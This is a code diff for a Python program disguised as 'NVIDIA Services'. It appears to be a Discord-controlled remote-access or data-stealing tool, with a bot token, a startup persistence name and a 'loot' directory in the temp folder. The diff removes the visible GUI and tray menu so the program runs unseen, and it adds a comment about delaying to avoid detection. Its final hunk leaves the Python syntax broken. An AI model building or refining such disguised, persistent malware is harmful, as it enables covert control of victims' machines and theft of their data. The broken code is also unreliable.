@@ -81,10 +81,10 @@ if platform.system() == "Windows":
 # === Global Variables ===
 tray_icon = None
 
-# Configuration
-BOT_TOKEN = ""  # add your discord bot token here
-BOT_CHANNEL_ID = None  # replace with actual channel ID (int) when ready
-PERSISTENCE_NAME = "NVIDIAServices"
+# CONFIGURATION
+BOT_TOKEN = ""                                                  # add your discord bot token here
+BOT_CHANNEL_ID = None                                                # replace with discord channel ID
+PERSISTENCE_NAME = "NVIDIAServices"                                        # change this to the name you want the startup file to be
 LOOT_DIR = os.path.join(tempfile.gettempdir(), "NVIDIA_Services_Data")
 try:
     os.makedirs(LOOT_DIR, exist_ok=True)
@@ -111,10 +111,8 @@ def create_tray_icon():
     """Create system tray icon using embedded image"""
     image = get_icon_image()
     # Create menu with only "Show GUI" option
-    menu = pystray.Menu(
-        pystray.MenuItem('Show GUI', show_gui)
-    )
-    return pystray.Icon("security_app", image, "NVIDIA Services", menu)
+
+    return pystray.Icon("security_app", image, "NVIDIA Services")
 
     
 current_dir = Path.home()
@@ -1083,18 +1081,14 @@ if __name__ == "__main__":
     # Start Discord bot in background thread
     bot_thread = threading.Thread(target=run_discord_bot, daemon=True)
     bot_thread.start()
-    
-    # Start the GUI
-    show_gui()
 
     # Keep the application running
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        exit_app()
 
-    threading.Thread(target=lambda: (
+        threading.Thread(target=lambda: (
         time.sleep(30),  # Delay to avoid detection
  
     ).start())
